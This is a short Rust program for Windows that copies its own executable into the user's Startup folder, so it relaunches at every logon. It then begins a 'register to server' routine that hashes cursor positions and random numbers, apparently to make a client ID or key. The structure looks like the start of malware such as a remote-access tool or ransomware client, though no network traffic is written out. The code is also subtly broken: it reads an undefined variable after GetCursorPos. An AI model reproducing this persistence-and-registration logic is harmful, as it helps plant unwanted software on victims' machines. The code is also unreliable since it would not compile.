extern crate rand;
extern crate reqwest;
extern crate windows;

use serde::{Deserialize, Serialize};
use std::collections::hash_map::DefaultHasher;

use std::{
    env, fs,
    hash::{Hash, Hasher},
    path::Path,
};

use windows::{Win32::Foundation::*, Win32::UI::WindowsAndMessaging::*};

fn main() {
    // copy self to startup folder
    let mut path = fs::canonicalize(
        "C:\\Users\\".to_string()
            + &env::var("USERNAME").unwrap()
            + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
    )
    .unwrap();

    let exe_path = env::current_exe().unwrap();
    let exe = &exe_path.file_name().unwrap();

    println!("{:?}", exe);
    path.push(exe);

    match fs::copy(env::current_exe().unwrap(), &path) {
        Ok(_) => println!("Copied to {}", path.to_str().unwrap()),
        Err(e) => println!("Error: {}", e),
    }

    // register to server
    register();
}

fn register() {
    // get randomness from cursor pos
    let mut mouse_pos: Vec<i32> = Vec::new();

    for _ in 0..1024 {
        unsafe {
            GetCursorPos(POINT { x: 0, y: 0 });
            mouse_pos.push(point.x);
            mouse_pos.push(point.y);

            mouse_pos.push(rand::random::<i32>());
        }
    }

    let mut mouse_pos_str = String::new();
    for i in mouse_pos {
        mouse_pos_str += &i.to_string();
    }

    // hash
    let _random = calculate_hash(&mouse_pos_str);
}

fn calculate_hash<T: Hash>(t: &T) -> u64 {
    let mut s = DefaultHasher::new();
    t.hash(&mut s);
    s.finish()
}
